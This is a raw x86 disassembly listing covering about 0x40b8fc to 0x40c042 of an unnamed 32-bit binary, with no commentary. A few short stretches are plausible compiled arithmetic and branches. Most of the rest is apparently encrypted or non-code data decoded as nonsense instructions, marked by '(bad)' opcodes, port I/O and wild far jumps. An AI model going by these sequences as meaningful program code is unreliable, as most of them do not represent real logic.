  40b8fc:	mov    edi,DWORD PTR [ebp-0x4]
  40b8ff:	xor    edx,eax
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
  40b943:	shl    BYTE PTR [ebx+0x7f2566fb],cl
  40b949:	mov    BYTE PTR [ebx+0x70708360],al
  40b94f:	lahf   
  40b950:	jge    0x40b9c2
  40b952:	jo     0x40b8eb
  40b954:	xchg   edx,eax
  40b955:	sbb    bl,BYTE PTR [ebx-0x42]
  40b958:	fwait
  40b959:	pop    ebx
  40b95a:	lods   al,BYTE PTR ds:[esi]
  40b95b:	xchg   esp,eax
  40b95c:	(bad)  
  40b95d:	push   esp
  40b95e:	daa    
  40b95f:	and    BYTE PTR [edi],ch
  40b961:	sar    DWORD PTR [edx+0x18614ae8],cl
  40b967:	loop   0x40b938
  40b969:	cld    
  40b96a:	popf   
  40b96b:	cdq    
  40b96c:	jle    0x40b9d8
  40b96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b96f:	test   BYTE PTR [edx-0x271c8ed5],bl
  40b975:	mov    cl,0x89
  40b977:	push   ebx
  40b978:	es loopne 0x40b9db
  40b97b:	hlt    
  40b97c:	sbb    ch,BYTE PTR [edi-0x21759c7c]
  40b982:	xchg   ecx,eax
  40b983:	adc    cl,BYTE PTR [esi-0x15]
  40b986:	jmp    0x40b970
  40b988:	push   edi
  40b989:	leave  
  40b98a:	bound  edx,QWORD PTR gs:[edi]
  40b98d:	iret   
  40b98e:	mov    esi,0x9665c52e
  40b993:	(bad)  
  40b994:	push   ecx
  40b995:	mov    eax,0x7ba55aa8
  40b99a:	call   0x8d05395
  40b99f:	pop    eax
  40b9a0:	dec    esp
  40b9a1:	jo     0x40b93c
  40b9a3:	mov    bh,0x4c
  40b9a5:	mov    bh,0x78
  40b9a7:	ss int3 
  40b9a9:	or     al,dh
  40b9ab:	and    esi,ebp
  40b9ad:	mov    ah,0x75
  40b9af:	pushf  
  40b9b0:	push   es
  40b9b1:	jecxz  0x40ba1e
  40b9b3:	xchg   ebp,eax
  40b9b4:	push   edx
  40b9b5:	inc    eax
  40b9b6:	inc    eax
  40b9b7:	sar    BYTE PTR [esi],cl
  40b9b9:	bt     DWORD PTR [eax],esp
  40b9bc:	repz fdiv st,st(6)
  40b9bf:	add    dh,bl
  40b9c1:	mov    dl,0x2a
  40b9c3:	pop    ss
  40b9c4:	ret    0xa00d
  40b9c7:	xchg   edx,eax
  40b9c8:	pop    edx
  40b9c9:	or     dh,BYTE PTR [edx]
  40b9cb:	les    ebx,FWORD PTR [eax-0x72]
  40b9ce:	fnstsw WORD PTR [esi-0x7e]
  40b9d1:	scas   eax,DWORD PTR es:[edi]
  40b9d2:	das    
  40b9d3:	sub    dl,BYTE PTR [esp+ecx*1-0x6cb9198f]
  40b9da:	mov    al,ds:0x7707acbd
  40b9df:	jg     0x40ba53
  40b9e1:	inc    ecx
  40b9e2:	push   es
  40b9e3:	jne    0x40b9a1
  40b9e5:	inc    eax
  40b9e6:	cmp    DWORD PTR [ecx],edi
  40b9e8:	rcl    edx,cl
  40b9ea:	retf   0xb42e
  40b9ed:	popf   
  40b9ee:	add    ch,dl
  40b9f0:	sub    DWORD PTR [esi+edx*2],edi
  40b9f3:	hlt    
  40b9f4:	mov    eax,0x77f7d952
  40b9f9:	dec    esp
  40b9fa:	push   ss
  40b9fb:	dec    edi
  40b9fc:	mov    es,WORD PTR [ebp-0xb9bc8b1]
  40ba02:	jmp    0xb107:0x3dfb99d9
  40ba09:	pop    edi
  40ba0a:	les    edi,FWORD PTR [ecx+0x64]
  40ba0d:	and    esi,DWORD PTR [edi]
  40ba0f:	sbb    DWORD PTR [ebp+0x137b6c01],ebp
  40ba15:	mov    ah,0x48
  40ba17:	mov    BYTE PTR [edx+edi*2],ch
  40ba1a:	inc    eax
  40ba1b:	inc    esi
  40ba1c:	mov    esp,DWORD PTR [edx+0x133acea7]
  40ba22:	push   esp
  40ba23:	sbb    bl,dl
  40ba25:	cmovo  eax,DWORD PTR [ecx-0x2adf823c]
  40ba2c:	in     eax,0x1f
  40ba2e:	out    0xe7,eax
  40ba30:	lds    esp,FWORD PTR [ecx+0x1f66733]
  40ba36:	inc    edx
  40ba37:	inc    esp
  40ba38:	dec    esi
  40ba39:	jne    0x40ba4b
  40ba3b:	fisttp QWORD PTR [ebx+edi*4+0x12]
  40ba3f:	or     edi,0xfffffff0
  40ba42:	ret    
  40ba43:	test   BYTE PTR [edx],cl
  40ba45:	push   esi
  40ba46:	xchg   edi,eax
  40ba47:	lahf   
  40ba48:	clc    
  40ba49:	jmp    0x40ba85
  40ba4b:	cmp    BYTE PTR [ebx],cl
  40ba4d:	(bad)  
  40ba4e:	in     al,0x4e
  40ba50:	mov    al,0xfc
  40ba52:	inc    edi
  40ba53:	dec    esi
  40ba54:	inc    ebx
  40ba55:	or     eax,0xe7ff7bca
  40ba5a:	into   
  40ba5b:	xor    BYTE PTR [edx],al
  40ba5d:	aaa    
  40ba5e:	dec    edi
  40ba5f:	mov    BYTE PTR [eax+0x67],al
  40ba62:	cs jmp 0x40ba1f
  40ba65:	dec    ebp
  40ba66:	mov    ebp,0xf4894639
  40ba6b:	dec    edi
  40ba6c:	cwde   
  40ba6d:	mov    ebp,0x72f795e1
  40ba72:	jmp    0x37c8a95d
  40ba77:	ins    BYTE PTR es:[edi],dx
  40ba78:	retf   0x2e3e
  40ba7b:	(bad)  
  40ba7c:	lods   al,BYTE PTR ds:[esi]
  40ba7d:	lods   eax,DWORD PTR ds:[esi]
  40ba7e:	push   eax
  40ba7f:	and    BYTE PTR [edi+eax*2+0x35],bh
  40ba83:	xchg   esp,eax
  40ba84:	pop    ds
  40ba85:	mov    edi,0xd09ad06
  40ba8a:	mov    esp,0x27d4ebbe
  40ba8f:	adc    eax,0xa2385653
  40ba94:	or     eax,0xefe50282
  40ba99:	adc    esi,ecx
  40ba9b:	ss push esi
  40ba9d:	xchg   DWORD PTR [esi],ebp
  40ba9f:	sbb    esi,DWORD PTR [eax+ebp*2+0x6cc7c75e]
  40baa6:	push   ss
  40baa7:	xor    ebx,DWORD PTR [esi+0x79934539]
  40baad:	ror    BYTE PTR [ebx],cl
  40baaf:	mov    ah,0x28
  40bab1:	test   al,0x86
  40bab3:	das    
  40bab4:	push   edi
  40bab5:	lods   eax,DWORD PTR ds:[esi]
  40bab6:	push   edi
  40bab7:	xlat   BYTE PTR ds:[ebx]
  40bab8:	sbb    ch,BYTE PTR [eax-0x68183cd6]
  40babe:	mov    bl,0xc5
  40bac0:	adc    eax,0xdb318c0c
  40bac5:	mov    ds:0x29d96aad,eax
  40baca:	ins    BYTE PTR es:[edi],dx
  40bacb:	or     edi,ebp
  40bacd:	hlt    
  40bace:	pop    edx
  40bacf:	mov    eax,ds:0x191a4a3c
  40bad4:	push   ebp
  40bad5:	(bad)  
  40bad6:	cmp    esi,eax
  40bad8:	pop    edi
  40bad9:	loope  0x40ba6c
  40badb:	add    BYTE PTR [bx+si+0x4804],dl
  40bae0:	or     al,0xe6
  40bae2:	mov    ecx,0xb186d6d7
  40bae7:	ja     0x40bac8
  40bae9:	jl     0x40baf8
  40baeb:	push   ss
  40baec:	or     DWORD PTR [ebp-0x5c],edx
  40baef:	test   al,0x31
  40baf1:	js     0x40bb71
  40baf3:	dec    eax
  40baf4:	xor    eax,eax
  40baf6:	inc    eax
  40baf7:	shr    ah,cl
  40baf9:	cmp    DWORD PTR [ebx],ecx
  40bafb:	leave  
  40bafc:	mov    ah,0xc
  40bafe:	in     al,0xd3
  40bb00:	es aaa 
  40bb02:	inc    ecx
  40bb03:	lock mov eax,0x1983b3e2
  40bb09:	outs   dx,BYTE PTR ds:[esi]
  40bb0a:	cmc    
  40bb0b:	lods   al,BYTE PTR ds:[esi]
  40bb0c:	test   al,0x3b
  40bb0e:	or     dl,dl
  40bb10:	mov    WORD PTR [edi-0x2b],cs
  40bb13:	mov    WORD PTR [edi+ebx*1-0x5b3ca691],cs
  40bb1a:	es push 0x27
  40bb1d:	(bad)  
  40bb1e:	es jecxz 0x40babe
  40bb21:	cmc    
  40bb22:	jmp    0x40badc
  40bb24:	test   al,0xd8
  40bb26:	pop    ds
  40bb27:	push   ecx
  40bb28:	ud2    
  40bb2a:	push   ecx
  40bb2b:	xchg   BYTE PTR ds:0xca4860ad,dh
  40bb31:	out    0xe7,al
  40bb33:	dec    ebp
  40bb34:	xor    eax,0xe1160319
  40bb39:	retf   
  40bb3a:	ffree  st(0)
  40bb3c:	mov    esp,0x973a92df
  40bb41:	pop    esi
  40bb42:	dec    ebp
  40bb43:	or     ecx,edx
  40bb45:	sbb    DWORD PTR ds:0x1120fcd2,esp
  40bb4b:	clc    
  40bb4c:	and    DWORD PTR [ecx+0x45],edx
  40bb4f:	gs adc al,0x16
  40bb52:	cdq    
  40bb53:	dec    esi
  40bb54:	xchg   ebp,eax
  40bb55:	daa    
  40bb56:	and    dh,BYTE PTR [edx+0x7b]
  40bb59:	xor    al,0x3d
  40bb5b:	test   DWORD PTR [ecx+0x1d1ef13d],ecx
  40bb61:	fs pushf 
  40bb63:	fidivr WORD PTR [ecx+0x4766b9f6]
  40bb69:	shl    BYTE PTR [ebx-0x14],cl
  40bb6c:	xchg   ebp,eax
  40bb6d:	aas    
  40bb6e:	push   esi
  40bb6f:	je     0x40bbcc
  40bb71:	out    dx,eax
  40bb72:	mov    esi,0x1bd5fe8f
  40bb77:	ja     0x40bbf4
  40bb79:	xor    edx,DWORD PTR [esi]
  40bb7b:	sub    eax,0x653d0585
  40bb80:	nop
  40bb81:	shl    DWORD PTR [edi+0x48598b32],0xb
  40bb88:	fist   DWORD PTR [eax-0x77]
  40bb8b:	test   al,0x7c
  40bb8d:	cli    
  40bb8e:	ins    BYTE PTR es:[edi],dx
  40bb8f:	shl    DWORD PTR [ecx-0xe],0x5d
  40bb93:	sbb    BYTE PTR [ecx+edx*1],0x99
  40bb97:	jno    0x40bbd4
  40bb99:	adc    DWORD PTR [eax+0x36],0x6ede855b
  40bba0:	xchg   ebp,eax
  40bba1:	add    ecx,DWORD PTR [esi+0x65ae0d17]
  40bba7:	sbb    cl,ah
  40bba9:	das    
  40bbaa:	jbe    0x40bbf8
  40bbac:	jb     0x40bb89
  40bbae:	call   0x7e4fac6e
  40bbb3:	call   0x21618d28
  40bbb8:	inc    ecx
  40bbb9:	or     al,0x8b
  40bbbb:	push   ds
  40bbbc:	repnz es (bad) 
  40bbbf:	jbe    0x40bbaf
  40bbc1:	and    BYTE PTR [edi+0x3c990594],bh
  40bbc7:	jle    0x40bb57
  40bbc9:	dec    esi
  40bbca:	out    dx,al
  40bbcb:	or     BYTE PTR [edx+0x33],cl
  40bbce:	xchg   BYTE PTR [ebp-0x1b],ch
  40bbd1:	pusha  
  40bbd2:	pop    ebp
  40bbd3:	xchg   edx,eax
  40bbd4:	dec    ebp
  40bbd5:	lock popf 
  40bbd7:	sub    al,BYTE PTR [esi]
  40bbd9:	xchg   ecx,eax
  40bbda:	pcmpgtw mm1,QWORD PTR [ecx+0x7bee8284]
  40bbe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bbe2:	jge    0x40bc53
  40bbe4:	jle    0x40bc5c
  40bbe6:	fs nop
  40bbe8:	daa    
  40bbe9:	mov    ebp,0xf9f2388a
  40bbee:	pop    es
  40bbef:	push   cs
  40bbf0:	test   DWORD PTR [eax+0x433e09e],ecx
  40bbf6:	out    dx,eax
  40bbf7:	or     al,0x21
  40bbf9:	inc    esp
  40bbfa:	mov    DWORD PTR [ecx+ebp*8-0x2542a654],edx
  40bc01:	pop    edi
  40bc02:	js     0x40bc2b
  40bc04:	fstp   DWORD PTR [ecx]
  40bc06:	aas    
  40bc07:	repnz fidiv DWORD PTR ds:0xfb0d5805
  40bc0e:	or     DWORD PTR [ebp-0x1f],esp
  40bc11:	ins    DWORD PTR es:[edi],dx
  40bc12:	sbb    al,0x74
  40bc14:	lods   al,BYTE PTR ds:[esi]
  40bc15:	dec    esp
  40bc16:	mov    ebx,DWORD PTR [ebp+0x39948be7]
  40bc1c:	jg     0x40bc0e
  40bc1e:	xor    ebx,DWORD PTR [ecx]
  40bc20:	fldenv [ebp+0x79]
  40bc23:	lea    eax,[ecx-0x71d42119]
  40bc29:	adc    ch,BYTE PTR [esi]
  40bc2b:	repnz stos BYTE PTR es:[edi],al
  40bc2d:	js     0x40bc13
  40bc2f:	xor    eax,0x8cb65cfb
  40bc34:	mov    bl,0x65
  40bc36:	mov    BYTE PTR [edi+0x12],ah
  40bc39:	iret   
  40bc3a:	test   BYTE PTR [eax],0x6f
  40bc3d:	jnp    0x40bc07
  40bc3f:	cwde   
  40bc40:	xchg   ecx,eax
  40bc41:	mov    ecx,0x54fd623e
  40bc46:	fsub   DWORD PTR gs:[ebp+0x244150e4]
  40bc4d:	xchg   edx,eax
  40bc4e:	pop    edi
  40bc4f:	or     al,0xf2
  40bc51:	push   esi
  40bc52:	stos   BYTE PTR es:[edi],al
  40bc53:	je     0x40bcbe
  40bc55:	test   DWORD PTR [ebp-0x5a],ecx
  40bc58:	xchg   esi,eax
  40bc59:	sbb    BYTE PTR [ecx-0x7546ce3d],0x34
  40bc60:	jmp    0x1465bb13
  40bc65:	mov    DWORD PTR [ecx+0x241372df],ebx
  40bc6b:	scas   al,BYTE PTR es:[edi]
  40bc6c:	std    
  40bc6d:	cmp    eax,0x434793a3
  40bc72:	and    eax,0x96716977
  40bc77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc78:	lds    edx,FWORD PTR [esi-0x4d0cdff3]
  40bc7e:	es fmul st,st(5)
  40bc81:	jae    0x40bcf9
  40bc83:	mov    ebx,0x3ae32588
  40bc88:	sbb    al,0x33
  40bc8a:	sub    al,0x59
  40bc8c:	jo     0x40bc2c
  40bc8e:	sbb    eax,0x2f135b15
  40bc93:	mov    dl,0x6e
  40bc95:	sbb    ebx,DWORD PTR [edi]
  40bc97:	xchg   ebx,eax
  40bc98:	xchg   edi,edi
  40bc9a:	inc    ebx
  40bc9b:	repnz sub edi,esi
  40bc9e:	sbb    BYTE PTR [edx],0x8b
  40bca1:	in     eax,dx
  40bca2:	or     edi,ebx
  40bca4:	mov    cl,0x9b
  40bca6:	fisttp QWORD PTR [eax]
  40bca8:	jb     0x40bc9a
  40bcaa:	mov    eax,0x7119d03a
  40bcaf:	cmp    al,0x13
  40bcb1:	aad    0x99
  40bcb3:	adc    edi,DWORD PTR [esi+edi*1]
  40bcb6:	fst    QWORD PTR ds:0x87519cd9
  40bcbc:	sub    dl,BYTE PTR [edi-0x357a3076]
  40bcc2:	fwait
  40bcc3:	in     al,0x2
  40bcc5:	jo     0x40bd12
  40bcc7:	repz xor cl,0x35
  40bccb:	push   es
  40bccc:	mov    dh,0x5d
  40bcce:	and    bh,al
  40bcd0:	adc    bh,BYTE PTR [eax-0x30293072]
  40bcd6:	ror    DWORD PTR [ebx],0xd8
  40bcd9:	pop    ss
  40bcda:	add    al,0xd8
  40bcdc:	lahf   
  40bcdd:	test   eax,0x34220a6
  40bce2:	outs   dx,DWORD PTR ds:[esi]
  40bce3:	fldl2t 
  40bce5:	sbb    al,0x43
  40bce7:	cmp    eax,0x78150c30
  40bcec:	inc    esi
  40bced:	sbb    DWORD PTR [eax],edx
  40bcef:	popf   
  40bcf0:	pop    edx
  40bcf1:	(bad)  
  40bcf2:	arpl   WORD PTR [ebx+0x2bf05d8b],cx
  40bcf8:	fistp  QWORD PTR [ebx]
  40bcfa:	fimul  DWORD PTR [edi]
  40bcfc:	xchg   DWORD PTR [eax],ecx
  40bcfe:	add    BYTE PTR [eax],al
  40bd00:	add    BYTE PTR [ebx-0x1a1633ab],cl
  40bd06:	add    eax,DWORD PTR [eax]
  40bd08:	add    BYTE PTR [ebx+0x7d8bc455],cl
  40bd0e:	cld    
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    al,BYTE PTR [edi-0x70a0a997]
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd5e
  40bd4b:	mov    bl,0xfb
  40bd4d:	push   edi
  40bd4e:	jmp    0xd274:0x17570486
  40bd55:	icebp  
  40bd56:	xchg   cl,bh
  40bd58:	imul   ecx,DWORD PTR [esi+ebp*8-0x2b451957],0x13b2afe4
  40bd63:	popa   
  40bd64:	add    dl,BYTE PTR [eax+eiz*8-0x52]
  40bd68:	push   ss
  40bd69:	xor    BYTE PTR [ebx+ebx*8],cl
  40bd6c:	ja     0x40bd17
  40bd6e:	dec    ecx
  40bd6f:	mov    edi,ebx
  40bd71:	mov    ds:0xd6d35da0,eax
  40bd76:	add    eax,DWORD PTR [edx+edx*2]
  40bd79:	inc    ecx
  40bd7a:	cdq    
  40bd7b:	or     DWORD PTR [esp+esi*8],0xdc823728
  40bd82:	in     eax,0x0
  40bd84:	mov    DWORD PTR [ebx+0x6708ffaf],edi
  40bd8a:	sub    ebp,DWORD PTR ds:0x5a1e2454
  40bd90:	mov    edi,0x669f872c
  40bd95:	mov    dl,0xd4
  40bd97:	mov    ds:0xa17917d,eax
  40bd9c:	or     bh,BYTE PTR [ecx-0x6e06cbff]
  40bda2:	icebp  
  40bda3:	scas   eax,DWORD PTR es:[edi]
  40bda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bda5:	imul   esp,DWORD PTR [ecx-0x15],0x21cbd9e4
  40bdac:	enter  0x6f2c,0xbb
  40bdb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bdb1:	push   ds
  40bdb2:	and    al,0x1c
  40bdb4:	cmp    ch,bh
  40bdb6:	or     ebp,DWORD PTR [ecx-0x17]
  40bdb9:	add    al,bh
  40bdbb:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdbd:	dec    ebx
  40bdbe:	and    eax,0x7dd132ca
  40bdc3:	inc    eax
  40bdc4:	fst    DWORD PTR [ebp+edx*1-0x44]
  40bdc8:	push   cs
  40bdc9:	inc    ecx
  40bdca:	test   DWORD PTR [ebx-0x76941664],ebp
  40bdd0:	push   edx
  40bdd1:	daa    
  40bdd2:	mov    edx,0x6dae2fdb
  40bdd7:	inc    ecx
  40bdd8:	push   esp
  40bdd9:	ret    
  40bdda:	and    al,0xa5
  40bddc:	(bad)  
  40bddd:	push   eax
  40bdde:	sbb    al,0xc1
  40bde0:	loop   0x40bdfd
  40bde2:	xchg   DWORD PTR [edi-0x6e5d43],eax
  40bde8:	inc    edx
  40bde9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdea:	mov    DWORD PTR [esi+0x74],0x2875174c
  40bdf1:	jnp    0x40bdca
  40bdf3:	add    ah,BYTE PTR [edi+edx*2+0x55]
  40bdf7:	stos   DWORD PTR es:[edi],eax
  40bdf8:	fistp  DWORD PTR [edi-0x58]
  40bdfb:	push   esp
  40bdfc:	mov    edx,0x3d362f9d
  40be01:	xchg   ebx,eax
  40be02:	or     al,0xf4
  40be04:	cli    
  40be05:	add    cl,BYTE PTR [ebp+0x201a27e1]
  40be0b:	sbb    eax,0xd70c5e0c
  40be10:	dec    esi
  40be11:	push   esi
  40be12:	daa    
  40be13:	les    esp,FWORD PTR [edi-0x250fd1bc]
  40be19:	in     eax,0x3
  40be1b:	adc    al,0x4
  40be1d:	xchg   DWORD PTR [esi],esi
  40be1f:	adc    eax,0x9dd2ed54
  40be24:	jne    0x40be22
  40be26:	pop    eax
  40be27:	push   edi
  40be28:	pushf  
  40be29:	pop    esi
  40be2a:	sbb    al,0x93
  40be2c:	test   ch,dl
  40be2e:	loop   0x40be49
  40be30:	sti    
  40be31:	out    0x4d,eax
  40be33:	push   es
  40be34:	inc    esp
  40be35:	xchg   esp,eax
  40be36:	jns    0x40bdff
  40be38:	push   edx
  40be39:	add    esp,ebx
  40be3b:	mov    al,ds:0xdf5f54d4
  40be40:	push   ebp
  40be41:	jns    0x40be67
  40be43:	or     al,BYTE PTR [ebp-0x45]
  40be46:	ja     0x40be0e
  40be48:	ret    
  40be49:	sbb    BYTE PTR [edx-0x6a3a5a60],0x94
  40be50:	xchg   ebx,eax
  40be51:	stos   DWORD PTR es:[edi],eax
  40be52:	in     eax,0x2c
  40be54:	pop    ebp
  40be55:	loop   0x40be5e
  40be57:	mul    ebx
  40be59:	inc    BYTE PTR [edx+0x2]
  40be5c:	push   cs
  40be5d:	in     eax,0xec
  40be5f:	mov    dh,0x12
  40be61:	jbe    0x40be77
  40be63:	ss out 0xe6,al
  40be66:	fs sub eax,0x9e302b77
  40be6c:	jl     0x40be63
  40be6e:	rol    DWORD PTR [ecx+eiz*8+0x41],cl
  40be72:	mov    eax,ds:0xcdc7f976
  40be77:	int    0x71
  40be79:	and    eax,0xe6c9f0fe
  40be7e:	inc    ecx
  40be7f:	or     BYTE PTR [eax],ah
  40be81:	mov    ds:0xd5b479f2,eax
  40be86:	dec    edi
  40be87:	js     0x40be3c
  40be89:	cli    
  40be8a:	retf   0xa7ca
  40be8d:	push   esi
  40be8e:	mov    ch,0xd0
  40be90:	in     al,0xef
  40be92:	jnp    0x40bed0
  40be94:	mov    dh,0xf2
  40be96:	dec    esp
  40be97:	lods   al,BYTE PTR ds:[esi]
  40be98:	adc    al,0x93
  40be9a:	pop    eax
  40be9b:	stos   DWORD PTR es:[edi],eax
  40be9c:	xchg   esi,eax
  40be9d:	push   ecx
  40be9e:	sub    BYTE PTR [ebp-0x4f],ch
  40bea1:	and    BYTE PTR [eax],cl
  40bea3:	mov    cl,0xbd
  40bea5:	in     eax,dx
  40bea6:	sub    DWORD PTR [ecx+0x30c81d1b],esi
  40beac:	jp     0x40be5e
  40beae:	adc    ah,ah
  40beb0:	xor    ch,bl
  40beb2:	cdq    
  40beb3:	lahf   
  40beb4:	pop    ds
  40beb5:	mov    dh,bl
  40beb7:	cmp    al,0x3e
  40beb9:	ja     0x40bec6
  40bebb:	retf   0xd922
  40bebe:	in     al,dx
  40bebf:	mov    bh,0x54
  40bec1:	mov    eax,ds:0x8f043c1d
  40bec6:	push   ecx
  40bec7:	xlat   BYTE PTR ds:[ebx]
  40bec8:	fmul   QWORD PTR [esi]
  40beca:	scas   al,BYTE PTR es:[edi]
  40becb:	test   DWORD PTR [eax-0x55d20dc3],0x1b98914
  40bed5:	outs   dx,DWORD PTR ds:[esi]
  40bed6:	cwde   
  40bed7:	and    DWORD PTR [edi-0x2f47944c],0xf84d3f3
  40bee1:	xchg   edi,eax
  40bee2:	loop   0x40bec5
  40bee4:	xchg   DWORD PTR [eax],edi
  40bee6:	jae    0x40bed6
  40bee8:	push   edx
  40bee9:	cld    
  40beea:	dec    esi
  40beeb:	mov    ds:0x5ab6cbcb,al
  40bef0:	jge    0x40be86
  40bef2:	mov    ds:0x4cc659dd,eax
  40bef7:	sub    al,0x73
  40bef9:	fisttp QWORD PTR [edx-0x5b]
  40befc:	xchg   ebp,eax
  40befd:	push   0x14f9e7eb
  40bf02:	leave  
  40bf03:	daa    
  40bf04:	mov    eax,ds:0xe1c75d36
  40bf09:	retf   
  40bf0a:	jecxz  0x40beaf
  40bf0c:	loope  0x40bf24
  40bf0e:	retf   
  40bf0f:	xchg   esi,eax
  40bf10:	in     al,dx
  40bf11:	aas    
  40bf12:	out    dx,al
  40bf13:	les    ebx,FWORD PTR [edx-0x5efbdca0]
  40bf19:	pop    ebp
  40bf1a:	cmp    eax,0x48c78f5a
  40bf1f:	and    ebx,DWORD PTR [edx-0x544694d8]
  40bf25:	fbstp  TBYTE PTR [edx+edi*2]
  40bf28:	sti    
  40bf29:	jmp    0x40bf01
  40bf2b:	repnz icebp 
  40bf2d:	dec    edx
  40bf2e:	push   eax
  40bf2f:	push   es
  40bf30:	hlt    
  40bf31:	xchg   esi,eax
  40bf32:	add    BYTE PTR [edi+0x541f0577],ah
  40bf38:	xor    eax,0x1670e453
  40bf3e:	push   edx
  40bf3f:	aas    
  40bf40:	pop    ss
  40bf41:	daa    
  40bf42:	sti    
  40bf43:	xchg   ecx,eax
  40bf44:	xlat   BYTE PTR ds:[ebx]
  40bf45:	aad    0x9c
  40bf47:	add    ch,cl
  40bf49:	fnstcw WORD PTR [ebx]
  40bf4b:	les    esi,FWORD PTR [eax-0x3d]
  40bf4e:	cdq    
  40bf4f:	cs xchg ebp,eax
  40bf51:	fwait
  40bf52:	lahf   
  40bf53:	je     0x40bee9
  40bf55:	pop    ds
  40bf56:	dec    edi
  40bf57:	push   esi
  40bf58:	loop   0x40bfcc
  40bf5a:	out    0x7c,eax
  40bf5c:	retf   0x6097
  40bf5f:	aaa    
  40bf60:	test   eax,0x8619bcf9
  40bf65:	mov    ah,0x93
  40bf67:	fisub  WORD PTR ds:0x83342914
  40bf6d:	test   BYTE PTR ds:0x3db4544b,bh
  40bf73:	sub    bh,BYTE PTR [ebp+0x13359f19]
  40bf79:	push   0xffffff8a
  40bf7b:	sub    al,0xd4
  40bf7d:	adc    bh,bh
  40bf7f:	push   edi
  40bf80:	inc    edi
  40bf81:	xor    ebp,ebx
  40bf83:	pop    ecx
  40bf84:	mov    WORD PTR [esi-0x44cc9761],bp
  40bf8b:	aad    0x9b
  40bf8d:	jnp    0x40bfb3
  40bf8f:	mov    ds:0xb862def,eax
  40bf94:	(bad)  
  40bf95:	cmp    al,0x6f
  40bf97:	add    DWORD PTR [ecx+edx*4+0x27],edi
  40bf9b:	test   al,0xe5
  40bf9d:	addr16 pop ss
  40bf9f:	pop    edi
  40bfa0:	sti    
  40bfa1:	std    
  40bfa2:	div    DWORD PTR [ecx]
  40bfa4:	push   cs
  40bfa5:	fdivr  DWORD PTR [esi]
  40bfa7:	jae    0x40bffc
  40bfa9:	or     al,0x62
  40bfab:	mov    ecx,0xe3a37cb9
  40bfb0:	add    bh,BYTE PTR [ebp+0x70]
  40bfb3:	mov    ecx,cs
  40bfb5:	push   edx
  40bfb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb7:	pop    ds
  40bfb8:	jmp    0x40c00f
  40bfba:	pop    edi
  40bfbb:	mov    ds,WORD PTR [ecx+edi*8-0x3d]
  40bfbf:	inc    esi
  40bfc0:	std    
  40bfc1:	cmp    esp,DWORD PTR [edi-0x43b8d8cf]
  40bfc7:	add    eax,0x9190f41c
  40bfcc:	js     0x40bf74
  40bfce:	outs   dx,BYTE PTR ds:[esi]
  40bfcf:	(bad)  
  40bfd1:	in     al,0x9d
  40bfd3:	jb     0x40c02e
  40bfd5:	cdq    
  40bfd6:	xchg   edi,eax
  40bfd7:	sbb    eax,0x3b22eb23
  40bfdc:	or     DWORD PTR [ecx],0xfd5dc565
  40bfe2:	and    al,0xf8
  40bfe4:	test   al,0xa4
  40bfe6:	xchg   esi,eax
  40bfe7:	imul   edx,DWORD PTR [ebx-0x1d55eac],0xeba61e4b
  40bff1:	xor    dl,BYTE PTR [ebx+0x7de50c94]
  40bff7:	xlat   BYTE PTR ds:[ebx]
  40bff8:	loopne 0x40bfe6
  40bffa:	outs   dx,DWORD PTR fs:[esi]
  40bffc:	adc    eax,0x632fdee4
  40c001:	(bad)  
  40c003:	jp     0x40bf8c
  40c005:	fnstenv [edi+esi*4+0x51a4a36f]
  40c00c:	nop
  40c00d:	cdq    
  40c00e:	mul    DWORD PTR [edi-0x3e]
  40c011:	dec    ebp
  40c012:	jge    0x40c052
  40c014:	jecxz  0x40c033
  40c016:	xchg   edx,eax
  40c017:	cmp    bl,al
  40c019:	pusha  
  40c01a:	sbb    eax,0xeb1cc7da
  40c01f:	pop    ecx
  40c020:	dec    edi
  40c021:	inc    ecx
  40c022:	movnti DWORD PTR [ecx],edx
  40c025:	and    eax,0xa5bdcda7
  40c02a:	cmp    dh,al
  40c02c:	sbb    edi,DWORD PTR [ebx+edx*8-0x1d2895b1]
  40c033:	push   ebx
  40c034:	out    dx,al
  40c035:	data16 int 0xe2
  40c038:	and    BYTE PTR [edx+0x3f64e0dd],bh
  40c03e:	inc    esi
  40c03f:	jecxz  0x40c019
  40c041:	dec    esp
  40c042:	aaa    
